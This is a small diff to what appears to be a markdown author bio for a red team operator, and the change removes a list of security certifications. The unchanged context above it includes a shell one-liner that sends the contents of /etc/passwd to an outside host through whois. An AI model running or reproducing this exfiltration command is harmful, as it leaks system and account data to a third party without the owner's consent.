@@ -10,7 +10,7 @@ description: ""
 $ /usr/bin/whois -h tokyoneon.host -p 80 "$(cat /etc/passwd)"
 ```
 
-Tokyoneon is a certified red team operator with over one-hundred offensive security publications as well as experience exploiting weaknesses in web applications and vulnerabilities in modern infrastructure. eCPPT / eWPTX / OSCP / OSWP / PenTest+ / CySA+ / Security+
+Tokyoneon is a certified red team operator with over one-hundred offensive security publications as well as experience exploiting weaknesses in web applications and vulnerabilities in modern infrastructure.
 
 ---
 
